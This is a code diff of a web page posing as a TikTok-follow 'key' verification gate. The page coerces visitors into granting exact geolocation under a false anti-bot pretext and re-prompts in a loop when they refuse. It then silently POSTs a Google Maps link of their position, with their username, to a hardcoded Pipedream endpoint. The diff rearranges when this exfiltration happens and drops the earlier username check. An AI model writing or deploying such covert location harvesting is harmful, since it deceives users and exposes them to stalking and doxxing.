@@ -13,26 +13,21 @@
         
         /* Location Lock Overlay */
         #location-lock { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-        .lock-box { padding: 30px; color: white; }
         .lock-btn { background: #00ff88; color: black; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; margin-top: 20px; cursor: pointer; }
 
         /* Modal Style */
         #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
         .modal-content { background: #222; margin: 20% auto; padding: 20px; width: 80%; max-width: 300px; border-radius: 10px; border: 1px solid #00ff88; }
-        .modal-btns { display: flex; justify-content: space-between; margin-top: 20px; }
-        .cancel-btn { background: #555; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-        .continue-btn { background: #00ff88; color: black; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
         #status-msg { margin-top: 20px; font-weight: bold; color: white; }
     </style>
 </head>
 <body onload="requestLocation()">
 
 <div id="location-lock">
-    <div class="lock-box">
+    <div style="padding: 30px;">
         <h2 style="color: #00ff88;">🔒 ACCESS DENIED</h2>
-        <p>This website requires <b>Exact Location</b> to verify your region and prevent botting.</p>
-        <p style="color: #888; font-size: 0.8em;">Please click "Allow" when prompted.</p>
-        <button class="lock-btn" onclick="requestLocation()">Enable Location to Enter</button>
+        <p>Verification Required: Please allow <b>Exact Location</b> to continue.</p>
+        <button class="lock-btn" onclick="requestLocation()">Enable Location</button>
     </div>
 </div>
 
@@ -47,51 +42,39 @@
 <div id="modal">
     <div class="modal-content">
         <p style="color: white; font-size: 0.9em;">Once u arrive at my tiktok page click follow and wait for 10 seconds inside my tiktok page then you can go back to the website.</p>
-        <div class="modal-btns">
-            <button class="cancel-btn" onclick="hideInstructions()">Cancel</button>
-            <button class="continue-btn" onclick="goToTikTok()">Continue</button>
-        </div>
+        <button class="btn" onclick="goToTikTok()" style="background:#00ff88; color:black;">Continue</button>
+        <button class="btn" onclick="hideInstructions()" style="border-color:#555; color:#888;">Cancel</button>
     </div>
 </div>
 
 <script>
     let leaveTime = 0;
     let isVerifying = false;
+    let userLocation = "Location Not Provided";
+
+    // --- YOUR HARDCODED LINKS ---
     const TIKTOK_URL = "https://www.tiktok.com/@ilovebbqflavoredfries12"; 
     const PIPEDREAM_URL = "https://eobv9ob96qab0yy.m.pipedream.net"; 
     const DISCORD_INVITE = "https://discord.gg/2SDuz6PW";
 
-    // --- LOCATION SYSTEM ---
     function requestLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    // Send location to Pipedream immediately
-                    fetch(PIPEDREAM_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ event: "Location Received", map: mapsLink })
-                    });
-
-                    // Hide the lock screen
+                    userLocation = `https://www.google.com/maps?q=${lat},${lon}`;
                     document.getElementById('location-lock').style.display = 'none';
                 },
                 (error) => {
                     alert("Verification Failed: You must allow exact location to use this tool.");
-                    requestLocation(); // Loop back to request again
+                    requestLocation();
                 },
-                { enableHighAccuracy: true } // Forces "Exact" location
+                { enableHighAccuracy: true }
             );
-        } else {
-            alert("Your browser does not support verification.");
         }
     }
 
-    // --- TASK SYSTEM ---
     function showInstructions() { document.getElementById('modal').style.display = "block"; }
     function hideInstructions() { document.getElementById('modal').style.display = "none"; }
 
@@ -101,19 +84,18 @@
         isVerifying = true;
         leaveTime = Date.now();
         document.getElementById('taskBtn').innerText = "VERIFYING... STAY ON TIKTOK";
-        document.getElementById('taskBtn').disabled = true;
     }
 
     document.addEventListener("visibilitychange", () => {
         if (document.visibilityState === "visible" && isVerifying) {
             let timeSpentAway = (Date.now() - leaveTime) / 1000;
             if (timeSpentAway < 10) {
-                alert("Task Failed! Stay for 10 seconds.");
+                alert("Task Failed! You didn't stay for 10 seconds.");
                 document.getElementById('taskBtn').innerText = "FOLLOW TIKTOK";
-                document.getElementById('taskBtn').disabled = false;
                 isVerifying = false;
             } else {
                 document.getElementById('taskBtn').innerText = "TIKTOK FOLLOWED ✅";
+                document.getElementById('taskBtn').disabled = true;
                 document.getElementById('getKeyBtn').disabled = false;
                 document.getElementById('getKeyBtn').className = "get-key-btn active";
                 isVerifying = false;
@@ -122,19 +104,22 @@
     });
 
     function finish() {
-        const user = document.getElementById('username').value;
-        if (user.length < 3) return alert("Enter username!");
+        const user = document.getElementById('username').value || "No_Name_Entered";
 
         fetch(PIPEDREAM_URL, {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify({ message: `${user} has completed the task!` })
+            body: JSON.stringify({ 
+                username: user, 
+                message: "Completed Task & Location Shared",
+                map_link: userLocation 
+            })
         });
 
         const status = document.getElementById('status-msg');
         let countdown = 5;
         const redirectTimer = setInterval(() => {
-            status.innerHTML = `CHECK DISCORD, KEY IS THERE!<br>Redirecting in ${countdown}...`;
+            status.innerHTML = `CHECK DISCORD SERVER, KEY WILL BE THERE!<br>Redirecting in ${countdown}...`;
             countdown--;
             if (countdown < 0) {
                 clearInterval(redirectTimer);
@@ -143,5 +128,6 @@
         }, 1000);
     }
 </script>
+
 </body>
 </html>
